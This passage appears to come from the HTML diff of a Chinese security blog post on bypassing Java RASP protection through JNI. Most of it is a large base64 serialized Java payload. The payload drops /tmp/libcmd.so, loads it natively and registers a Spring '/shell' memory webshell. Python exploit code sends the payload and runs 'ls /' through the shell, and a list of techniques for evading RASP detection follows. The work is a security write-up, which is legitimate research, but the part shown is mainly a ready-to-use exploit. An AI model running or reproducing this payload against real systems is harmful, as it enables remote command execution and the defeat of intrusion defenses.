BQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFEd0VRQUFBQUFBQUxBUkFBQUFBQUFBQVFBQUFBQUFBQUNxQUFBQUFBQUFBQXdBQUFBQUFBQUFBQkFBQUFBQUFBQU5BQUFBQUFBQUFMUVVBQUFBQUFBQUdRQUFBQUFBQUFBUVBnQUFBQUFBQUJzQUFBQUFBQUFBQ0FBQUFBQUFBQUFhQUFBQUFBQUFBQmcrQUFBQUFBQUFIQUFBQUFBQUFBQUlBQUFBQUFBQUFQWCsvMjhBQUFBQThBSUFBQUFBQUFBRkFBQUFBQUFBQUdnRUFBQUFBQUFBQmdBQUFBQUFBQUFZQXdBQUFBQUFBQW9BQUFBQUFBQUF5Z0FBQUFBQUFBQUxBQUFBQUFBQUFCZ0FBQUFBQUFBQUF3QUFBQUFBQUFBQVFBQUFBQUFBQUFJQUFBQUFBQUFBd0FBQUFBQUFBQUFVQUFBQUFBQUFBQWNBQUFBQUFBQUFGd0FBQUFBQUFBQW9CZ0FBQUFBQUFBY0FBQUFBQUFBQWdBVUFBQUFBQUFBSUFBQUFBQUFBQUtnQUFBQUFBQUFBQ1FBQUFBQUFBQUFZQUFBQUFBQUFBUDcvLzI4QUFBQUFVQVVBQUFBQUFBRC8vLzl2QUFBQUFBRUFBQUFBQUFBQThQLy9id0FBQUFBeUJRQUFBQUFBQVBuLy8yOEFBQUFBQXdBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUlENEFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBTUJBQUFBQUFBQUJBRUFBQUFBQUFBRkFRQUFBQUFBQUFZQkFBQUFBQUFBQndFQUFBQUFBQUFJQVFBQUFBQUFBQWtCQUFBQUFBQUFDZ0VBQUFBQUFBQUZoQUFBQUFBQUFBUjBORE9pQW9WV0oxYm5SMUlERXhMalF1TUMweGRXSjFiblIxTVg0eU1pNHdOQ2tnTVRFdU5DNHdBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQVFBQUFBUUE4ZjhBQUFBQUFBQUFBQUFBQUFBQUFBQUFEQUFBQUFJQURnQkFFUUFBQUFBQUFBQUFBQUFBQUFBQURnQUFBQUlBRGdCd0VRQUFBQUFBQUFBQUFBQUFBQUFBSVFBQUFBSUFEZ0N3RVFBQUFBQUFBQUFBQUFBQUFBQUFOd0FBQUFFQUdRQmdRQUFBQUFBQUFBRUFBQUFBQUFBQVF3QUFBQUVBRkFBWVBnQUFBQUFBQUFBQUFBQUFBQUFBYWdBQUFBSUFEZ0R3RVFBQUFBQUFBQUFBQUFBQUFBQUFkZ0FBQUFFQUV3QVFQZ0FBQUFBQUFBQUFBQUFBQUFBQWxRQUFBQVFBOGY4QUFBQUFBQUFBQUFBQUFBQUFBQUFBQVFBQUFBUUE4ZjhBQUFBQUFBQUFBQUFBQUFBQUFBQUFuQUFBQUFFQUVnRG9JQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQVFBOGY4QUFBQUFBQUFBQUFBQUFBQUFBQUFBcWdBQUFBSUFEd0MwRkFBQUFBQUFBQUFBQUFBQUFBQUFzQUFBQUFFQUdBQllRQUFBQUFBQUFBQUFBQUFBQUFBQXZRQUFBQUVBRlFBZ1BnQUFBQUFBQUFBQUFBQUFBQUFBeGdBQUFBQUFFUUFFSUFBQUFBQUFBQUFBQUFBQUFBQUEyUUFBQUFFQUdBQmdRQUFBQUFBQUFBQUFBQUFBQUFBQTVRQUFBQUVBRndBQVFBQUFBQUFBQUFBQUFBQUFBQUFBK3dBQUFBSUFDZ0FBRUFBQUFBQUFBQUFBQUFBQUFBQUFBUUVBQUNBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUhRRUFBQklBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBT0FFQUFCSUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFTd0VBQUJJQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQVhnRUFBQklBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBY0FFQUFCSUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFnUUVBQUNBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQWtBRUFBQklBRGdENUVRQUFBQUFBQVBRQUFBQUFBQUFBbHdFQUFCSUFEZ0R0RWdBQUFBQUFBTVVCQUFBQUFBQUFyZ0VBQUJJQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQXdBRUFBQklBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBMHdFQUFDQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUE3UUVBQUNJQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFHTnlkSE4wZFdabUxtTUFaR1Z5WldkcGMzUmxjbDkwYlY5amJHOXVaWE1BWDE5a2IxOW5iRzlpWVd4ZlpIUnZjbk5mWVhWNEFHTnZiWEJzWlhSbFpDNHdBRjlmWkc5ZloyeHZZbUZzWDJSMGIzSnpYMkYxZUY5bWFXNXBYMkZ5Y21GNVgyVnVkSEo1QUdaeVlXMWxYMlIxYlcxNUFGOWZabkpoYldWZlpIVnRiWGxmYVc1cGRGOWhjbkpoZVY5bGJuUnllUUJGZG1sc0xtTUFYMTlHVWtGTlJWOUZUa1JmWHdCZlptbHVhUUJmWDJSemIxOW9ZVzVrYkdVQVgwUlpUa0ZOU1VNQVgxOUhUbFZmUlVoZlJsSkJUVVZmU0VSU0FGOWZWRTFEWDBWT1JGOWZBRjlIVEU5Q1FVeGZUMFpHVTBWVVgxUkJRa3hGWHdCZmFXNXBkQUJmU1ZSTlgyUmxjbVZuYVhOMFpYSlVUVU5zYjI1bFZHRmliR1VBWDE5emRHRmphMTlqYUd0ZlptRnBiRUJIVEVsQ1ExOHlMalFBY0dOc2IzTmxRRWRNU1VKRFh6SXVNaTQxQUcxbGJYTmxkRUJIVEVsQ1ExOHlMakl1TlFCbVoyVjBjMEJIVEVsQ1ExOHlMakl1TlFCbVpXOW1RRWRNU1VKRFh6SXVNaTQxQUY5ZloyMXZibDl6ZEdGeWRGOWZBR1Y0WldOdFpBQktZWFpoWDBWMmFXeERiR0Z6YzE5bGVHVmpRMjFrQUhCdmNHVnVRRWRNU1VKRFh6SXVNaTQxQUhOMGNtTmhkRUJIVEVsQ1ExOHlMakl1TlFCZlNWUk5YM0psWjJsemRHVnlWRTFEYkc5dVpWUmhZbXhsQUY5ZlkzaGhYMlpwYm1Gc2FYcGxRRWRNU1VKRFh6SXVNaTQxQUFBdWMzbHRkR0ZpQUM1emRISjBZV0lBTG5Ob2MzUnlkR0ZpQUM1dWIzUmxMbWR1ZFM1d2NtOXdaWEowZVFBdWJtOTBaUzVuYm5VdVluVnBiR1F0YVdRQUxtZHVkUzVvWVhOb0FDNWtlVzV6ZVcwQUxtUjVibk4wY2dBdVoyNTFMblpsY25OcGIyNEFMbWR1ZFM1MlpYSnphVzl1WDNJQUxuSmxiR0V1WkhsdUFDNXlaV3hoTG5Cc2RBQXVhVzVwZEFBdWNHeDBMbWR2ZEFBdWNHeDBMbk5sWXdBdWRHVjRkQUF1Wm1sdWFRQXVjbTlrWVhSaEFDNWxhRjltY21GdFpWOW9aSElBTG1Wb1gyWnlZVzFsQUM1cGJtbDBYMkZ5Y21GNUFDNW1hVzVwWDJGeWNtRjVBQzVrZVc1aGJXbGpBQzVuYjNRdWNHeDBBQzVrWVhSaEFDNWljM01BTG1OdmJXMWxiblFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFCc0FBQUFIQUFBQUFnQUFBQUFBQUFDb0FnQUFBQUFBQUtnQ0FBQUFBQUFBSUFBQUFBQUFBQUFBQUFBQUFBQUFBQWdBQUFBQUFBQUFBQUFBQUFBQUFBQXVBQUFBQndBQUFBSUFBQUFBQUFBQXlBSUFBQUFBQUFESUFnQUFBQUFBQUNRQUFBQUFBQUFBQUFBQUFBQUFBQUFFQUFBQUFBQUFBQUFBQUFBQUFBQUFRUUFBQVBiLy8yOENBQUFBQUFBQUFQQUNBQUFBQUFBQThBSUFBQUFBQUFBb0FBQUFBQUFBQUFRQUFBQUFBQUFBQ0FBQUFBQUFBQUFBQUFBQUFBQUFBRXNBQUFBTEFBQUFBZ0FBQUFBQUFBQVlBd0FBQUFBQUFCZ0RBQUFBQUFBQVVBRUFBQUFBQUFBRkFBQUFBUUFBQUFnQUFBQUFBQUFBR0FBQUFBQUFBQUJUQUFBQUF3QUFBQUlBQUFBQUFBQUFhQVFBQUFBQUFBQm9CQUFBQUFBQUFNb0FBQUFBQUFBQUFBQUFBQUFBQUFBQkFBQUFBQUFBQUFBQUFBQUFBQUFBV3dBQUFQLy8vMjhDQUFBQUFBQUFBRElGQUFBQUFBQUFNZ1VBQUFBQUFBQWNBQUFBQUFBQUFBUUFBQUFBQUFBQUFnQUFBQUFBQUFBQ0FBQUFBQUFBQUdnQUFBRCsvLzl2QWdBQUFBQUFBQUJRQlFBQUFBQUFBRkFGQUFBQUFBQUFNQUFBQUFBQUFBQUZBQUFBQVFBQUFBZ0FBQUFBQUFBQUFBQUFBQUFBQUFCM0FBQUFCQUFBQUFJQUFBQUFBQUFBZ0FVQUFBQUFBQUNBQlFBQUFBQUFBS2dBQUFBQUFBQUFCQUFBQUFBQUFBQUlBQUFBQUFBQUFCZ0FBQUFBQUFBQWdRQUFBQVFBQUFCQ0FBQUFBQUFBQUNnR0FBQUFBQUFBS0FZQUFBQUFBQURBQUFBQUFBQUFBQVFBQUFBWEFBQUFDQUFBQUFBQUFBQVlBQUFBQUFBQUFJc0FBQUFCQUFBQUJnQUFBQUFBQUFBQUVBQUFBQUFBQUFBUUFBQUFBQUFBR3dBQUFBQUFBQUFBQUFBQUFBQUFBQVFBQUFBQUFBQUFBQUFBQUFBQUFBQ0dBQUFBQVFBQUFBWUFBQUFBQUFBQUlCQUFBQUFBQUFBZ0VBQUFBQUFBQUpBQUFBQUFBQUFBQUFBQUFBQUFBQUFRQUFBQUFBQUFBQkFBQUFBQUFBQUFrUUFBQUFFQUFBQUdBQUFBQUFBQUFMQVFBQUFBQUFBQXNCQUFBQUFBQUFBUUFBQUFBQUFBQUFBQUFBQUFBQUFBRUFBQUFBQUFBQUFRQUFBQUFBQUFBSm9BQUFBQkFBQUFCZ0FBQUFBQUFBREFFQUFBQUFBQUFNQVFBQUFBQUFBQWdBQUFBQUFBQUFBQUFBQUFBQUFBQUJBQUFBQUFBQUFBRUFBQUFBQUFBQUNqQUFBQUFRQUFBQVlBQUFBQUFBQUFRQkVBQUFBQUFBQkFFUUFBQUFBQUFISURBQUFBQUFBQUFBQUFBQUFBQUFBUUFBQUFBQUFBQUFBQUFBQUFBQUFBcVFBQUFBRUFBQUFHQUFBQUFBQUFBTFFVQUFBQUFBQUF0QlFBQUFBQUFBQU5BQUFBQUFBQUFBQUFBQUFBQUFBQUJBQUFBQUFBQUFBQUFBQUFBQUFBQUs4QUFBQUJBQUFBQWdBQUFBQUFBQUFBSUFBQUFBQUFBQUFnQUFBQUFBQUFBZ0FBQUFBQUFBQUFBQUFBQUFBQUFBRUFBQUFBQUFBQUFBQUFBQUFBQUFDM0FBQUFBUUFBQUFJQUFBQUFBQUFBQkNBQUFBQUFBQUFFSUFBQUFBQUFBRFFBQUFBQUFBQUFBQUFBQUFBQUFBQUVBQUFBQUFBQUFBQUFBQUFBQUFBQXhRQUFBQUVBQUFBQ0FBQUFBQUFBQURnZ0FBQUFBQUFBT0NBQUFBQUFBQUMwQUFBQUFBQUFBQUFBQUFBQUFBQUFDQUFBQUFBQUFBQUFBQUFBQUFBQUFNOEFBQUFPQUFBQUF3QUFBQUFBQUFBUVBnQUFBQUFBQUJBdUFBQUFBQUFBQ0FBQUFBQUFBQUFBQUFBQUFBQUFBQWdBQUFBQUFBQUFDQUFBQUFBQUFBRGJBQUFBRHdBQUFBTUFBQUFBQUFBQUdENEFBQUFBQUFBWUxnQUFBQUFBQUFnQUFBQUFBQUFBQUFBQUFBQUFBQUFJQUFBQUFBQUFBQWdBQUFBQUFBQUE1d0FBQUFZQUFBQURBQUFBQUFBQUFDQStBQUFBQUFBQUlDNEFBQUFBQUFEQUFRQUFBQUFBQUFVQUFBQUFBQUFBQ0FBQUFBQUFBQUFRQUFBQUFBQUFBSlVBQUFBQkFBQUFBd0FBQUFBQUFBRGdQd0FBQUFBQUFPQXZBQUFBQUFBQUlBQUFBQUFBQUFBQUFBQUFBQUFBQUFnQUFBQUFBQUFBQ0FBQUFBQUFBQUR3QUFBQUFRQUFBQU1BQUFBQUFBQUFBRUFBQUFBQUFBQUFNQUFBQUFBQUFGZ0FBQUFBQUFBQUFBQUFBQUFBQUFBSUFBQUFBQUFBQUFnQUFBQUFBQUFBK1FBQUFBRUFBQUFEQUFBQUFBQUFBRmhBQUFBQUFBQUFXREFBQUFBQUFBQUlBQUFBQUFBQUFBQUFBQUFBQUFBQUNBQUFBQUFBQUFBQUFBQUFBQUFBQVA4QUFBQUlBQUFBQXdBQUFBQUFBQUJnUUFBQUFBQUFBR0F3QUFBQUFBQUFDQUFBQUFBQUFBQUFBQUFBQUFBQUFBRUFBQUFBQUFBQUFBQUFBQUFBQUFBRUFRQUFBUUFBQURBQUFBQUFBQUFBQUFBQUFBQUFBQUJnTUFBQUFBQUFBQ3NBQUFBQUFBQUFBQUFBQUFBQUFBQUJBQUFBQUFBQUFBRUFBQUFBQUFBQUFRQUFBQUlBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBa0RBQUFBQUFBQUFZQXdBQUFBQUFBQndBQUFBVUFBQUFDQUFBQUFBQUFBQVlBQUFBQUFBQUFBa0FBQUFEQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUtnekFBQUFBQUFBQ0FJQUFBQUFBQUFBQUFBQUFBQUFBQUVBQUFBQUFBQUFBQUFBQUFBQUFBQVJBQUFBQXdBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFDd05RQUFBQUFBQUEwQkFBQUFBQUFBQUFBQUFBQUFBQUFCQUFBQUFBQUFBQUFBQUFBQUFBQUEHAN4MAN8A4AEAGGphdmEvaW8vUmFuZG9tQWNjZXNzRmlsZQEADi90bXAvbGliY21kLnNvAQACcncMAEMA4QwA1wDiDADjAEQMAOQA5QEAFWphdmEubGFuZy5DbGFzc0xvYWRlcgwA5gDnAQAjamF2YS5sYW5nLkNsYXNzTG9hZGVyJE5hdGl2ZUxpYnJhcnkBAA9qYXZhL2xhbmcvQ2xhc3MBABBqYXZhL2xhbmcvU3RyaW5nBwDoDADpAG0MAOoA6wcA7AwA7QDuAQAPbmF0aXZlTGlicmFyaWVzDADvAPAHAPEMAPIA8wEAEGphdmEvdXRpbC9WZWN0b3IMAPQA9QcA9gEAEGphdmEvbGFuZy9PYmplY3QMAPcA+AwA+QD6DAD7APwMAP0A/gwA/wEABwEBDAECAQMBADlvcmcuc3ByaW5nZnJhbWV3b3JrLndlYi5zZXJ2bGV0LkRpc3BhdGNoZXJTZXJ2bGV0LkNPTlRFWFQHAQQMAQUBBgEANW9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvV2ViQXBwbGljYXRpb25Db250ZXh0AQBSb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL2Fubm90YXRpb24vUmVxdWVzdE1hcHBpbmdIYW5kbGVyTWFwcGluZwwBBwEIDAEJAQoHAQsBAFJvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvJEJ1aWxkZXJDb25maWd1cmF0aW9uAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlDAEMAOsBAAYvc2hlbGwMAQ0BDwcBEAwBEQESDAETARQMARUBFgEAE2phdmEvbGFuZy9FeGNlcHRpb24MARcARAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAMZ2V0UGFyYW1ldGVyAQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAFd3JpdGUBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAAVmbHVzaAEAEGphdmEvdXRpbC9CYXNlNjQBAApnZXREZWNvZGVyAQAHRGVjb2RlcgEAHCgpTGphdmEvdXRpbC9CYXNlNjQkRGVjb2RlcjsBABhqYXZhL3V0aWwvQmFzZTY0JERlY29kZXIBAAZkZWNvZGUBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCAQAnKExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nOylWAQAFKFtCKVYBAAVjbG9zZQEADmdldENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAB2Zvck5hbWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQARamF2YS9sYW5nL0Jvb2xlYW4BAARUWVBFAQARZ2V0RGVjbGFyZWRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQANc2V0QWNjZXNzaWJsZQEABChaKVYBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAFmdldERlY2xhcmVkQ29uc3RydWN0b3IBADMoW0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9Db25zdHJ1Y3RvcjsBAB1qYXZhL2xhbmcvcmVmbGVjdC9Db25zdHJ1Y3RvcgEAB3ZhbHVlT2YBABYoWilMamF2YS9sYW5nL0Jvb2xlYW47AQALbmV3SW5zdGFuY2UBACcoW0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAphZGRFbGVtZW50AQAVKExqYXZhL2xhbmcvT2JqZWN0OylWAQADc2V0AQAnKExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvT2JqZWN0OylWAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQA8b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9yZXF1ZXN0L1JlcXVlc3RDb250ZXh0SG9sZGVyAQAYY3VycmVudFJlcXVlc3RBdHRyaWJ1dGVzAQA9KClMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9yZXF1ZXN0L1JlcXVlc3RBdHRyaWJ1dGVzOwEAOW9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9SZXF1ZXN0QXR0cmlidXRlcwEADGdldEF0dHJpYnV0ZQEAJyhMamF2YS9sYW5nL1N0cmluZztJKUxqYXZhL2xhbmcvT2JqZWN0OwEAB2dldEJlYW4BACUoTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9PYmplY3Q7AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQA9b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbwEACWdldE1ldGhvZAEABXBhdGhzAQAHQnVpbGRlcgEAXChbTGphdmEvbGFuZy9TdHJpbmc7KUxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvJEJ1aWxkZXI7AQBFb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbyRCdWlsZGVyAQAHb3B0aW9ucwEAnShMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbyRCdWlsZGVyQ29uZmlndXJhdGlvbjspTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm8kQnVpbGRlcjsBAAVidWlsZAEAQSgpTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm87AQAPcmVnaXN0ZXJNYXBwaW5nAQBBKExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7KVYBAA9wcmludFN0YWNrVHJhY2UAIQAJAD4AAAACABoAPwBAAAEAQQAAAAIACgAaAEIAQAABAEEAAAACAA0ABgABAEMARAABAEUAAAAvAAEAAQAAAAUqtwABsQAAAAIARgAAAAYAAQAAABUARwAAAAwAAQAAAAUASABJAAABCQBKAEsAAQBMAAAABQEATQAAAAEATgBPAAMARQAAAJwAAgAFAAAAKCsSArkAAwIATi3GAB0tuAAEOgQsuQAFAQAZBLYABiy5AAUBALYAB7EAAAADAEYAAAAaAAYAAABHAAkASAANAEkAEwBKAB4ASwAnAE0ARwAAADQABQATABQAUABAAAQAAAAoAEgASQAAAAAAKABRAFIAAQAAACgAUwBUAAIACQAfAE0AQAADAFUAAAAIAAH8ACcHAFYAVwAAAAQAAQBYAEwAAAAJAgBRAAAAUwAAAAEAWQBaAAMARQAAAD8AAAADAAAAAbEAAAACAEYAAAAGAAEAAABSAEcAAAAgAAMAAAABAEgASQAAAAAAAQBbAFwAAQAAAAEAXQBeAAIAVwAAAAQAAQBfAEwAAAAJAgBbAAAAXQAAAAEAWQBgAAMARQAAAEkAAAAEAAAAAbEAAAACAEYAAAAGAAEAAABXAEcAAAAqAAQAAAABAEgASQAAAAAAAQBbAFwAAQAAAAEAYQBiAAIAAAABAGMAZAADAFcAAAAEAAEAXwBMAAAADQMAWwAAAGEAAABjAAAACABlAEQAAQBFAAAC9QAGABEAAAFWuAAIEgq2AAtLuwAMWRINEg63AA9MKyq2ABArtgAREgm2ABJNEhO4ABROEhW4ABQ6BBkEEhYFvQAXWQMSGFNZBLIAGVO2ABo6BRkFBLYAGy0SHLYAHToGGQYEtgAeGQYstgAfwAAgOgcZBAa9ABdZAxIXU1kEEhhTWQWyABlTtgAhOggZCAS2ACIZCAa9ACNZAxIJU1kEEg1TWQUDuAAkU7YAJToJGQcZCbYAJhkGLBkHtgAnGQUZCQW9ACNZAxINU1kEA7gAJFO2AChXuAApEioDuQArAwDAACw6ChkKEi25AC4CAMAALToLGQu2AC8SMLYAHToMGQwEtgAeGQwZC7YAH8AAMToNEgkSMgW9ABdZAxIzU1kEEjRTtgA1Og4EvQAYWQMSNlO4ADcZDbkAOAIAuQA5AQA6D7sACVm3ADo6EBkLGQ8ZEBkOtgA7pwAISyq2AD2xAAEAAAFNAVAAPAAEAEYAAACKACIAAAAeAAkAHwAVACAAGgAhAB4AJAAkACUAKgAmADEAJwBJACgATwApAFcAKgBdACsAaAAsAIMALQCJAC4ApQAvAKwAMAC0ADEAzAAzANwANADqADUA9gA2APwANwEAADgBCAA5AR8AOgEtADsBMgA8ATkAPQFCAD4BTQBCAVAAQAFRAEEBVQBDAEcAAAC2ABIACQFEAGYAZwAAABUBOABoAGkAAQAkASkAagBrAAIAKgEjAGwAbQADADEBHABuAG0ABABJAQQAbwBwAAUAVwD2AHEAcgAGAGgA5QBzAHQABwCDAMoAdQB2AAgApQCoAHcAeAAJANwAcQB5AHoACgDqAGMAewB8AAsA9gBXAH0AcgAMAQgARQB+AIEADQEfAC4AggBwAA4BOQAUAIMAhAAPAUIACwCFAEkAEAFRAAQAhgCHAAAAiAAAACoABAAqASMAbACJAAMAMQEcAG4AiQAEAGgA5QBzAIoABwCDAMoAdQCLAAgAVQAAAAkAAvcBUAcAjAQAAgCNAAAAAgCOAIAAAAAaAAMAMQDDAH8ACQCaAJYA3AAJAMoAwwEOBglwdAAEdGVzdHB3AQB4dXIAEltMamF2YS5sYW5nLkNsYXNzO6sW167LzVqZAgAAeHAAAAADdnIAI29yZy5zcHJpbmdmcmFtZXdvcmsuYW9wLlNwcmluZ1Byb3h5AAAAAAAAAAAAAAB4cHZyAClvcmcuc3ByaW5nZnJhbWV3b3JrLmFvcC5mcmFtZXdvcmsuQWR2aXNlZAAAAAAAAAAAAAAAeHB2cgAob3JnLnNwcmluZ2ZyYW1ld29yay5jb3JlLkRlY29yYXRpbmdQcm94eQAAAAAAAAAAAAAAeHA="""</span>
+
+hex_string <span class="token operator">=</span> hex<span class="token punctuation">(</span>len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
+hex_string <span class="token operator">=</span> str<span class="token punctuation">(</span>hex_string<span class="token punctuation">)</span>
+burp0_data <span class="token operator">=</span> f<span class="token string">"{hex_string}\r\n{payload}\r\n0\r\n\r\n"</span>
+res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>burp0_url<span class="token punctuation">,</span> headers<span class="token operator">=</span>burp0_headers<span class="token punctuation">,</span> data<span class="token operator">=</span>burp0_data<span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>baseUrl <span class="token operator">+</span> <span class="token string">"/shell?cmd=ls /"</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+</code></pre>
+<p>然后就可以执行命令了：</p>
+<p>​<img src="/Blogimages/Java%E5%AE%89%E5%85%A8--JNI%E7%BB%95%E8%BF%87RASP/image-20231123205812-xqfsigy.png" alt="image">​</p>
+<h3 id="其他绕过"><a href="#其他绕过" class="headerlink" title="其他绕过"></a>其他绕过</h3><p>借用<a target="_blank" rel="noopener" href="https://dummykitty.github.io/posts/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87-RASP/#%E5%85%B6%E4%BB%96%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95">Java 反序列化绕过 RASP | DummyKitty&apos;s blog</a>作者的总结：</p>
+<blockquote>
+<ol>
+<li>破坏 RASP 的开关。OpenRASP 中存在一个 hook 开关，反射修改这个 hook 开关可关闭所有拦截。Jrasp 没有明显的开关可以去操控但作者也实现的类似的效果。</li>
+<li>熔断开关。很多商业化的产品有类似的CPU熔断机制，如果 CPU 达到 90%，就自动关闭 Rasp 的拦截。因此可以通过发送一些大的数据包或者流量，造成 CPU 的压力来触发 RASP 的熔断开关</li>
+<li>伪装恶意类。很多 RASP 产品是通过堆栈信息回溯的方式来判断命令执行的地方从哪里来，例如检测 behinder 时会判断堆栈是否包含net.rebeyond.behinder类开头的信息。作者给出了伪装类名的方法。</li>
+<li>新建线程绕过。新建线程可以绕过堆栈检查，但无法绕过黑白名单。</li>
+<li>Bootstrap ClassLoader 加载绕过内存马检测。某些 RASP 在检测内存马时，通过判断当前类的 ClassLoader 是否存在对应的 .class 文件落地，使用Instrumentation.appendToBootstrapClassLoaderSearch 方法加载的 jar 包是以 Bootstrap ClassLoader 加载的，因此能够绕过检测。</li>
+<li>通过 Unsafe 方式绕过。Unsafe.allocateInstance方法可以实例化一个对象而不调用它的构造方法，再去执行它的 Native 方法，从而绕过 Rasp 的检测。作者给出的示例中，通过直接执行 forkAndExec 的 Native 方法来执行命令。</li>
+<li>通过 WindowsVirtualMachine 注入 ShellCode 加载。向自身进程植入并运行 ShellCode 绕过 RASP</li>
+<li>Java 跨平台任意 Native 代码执行。</li>
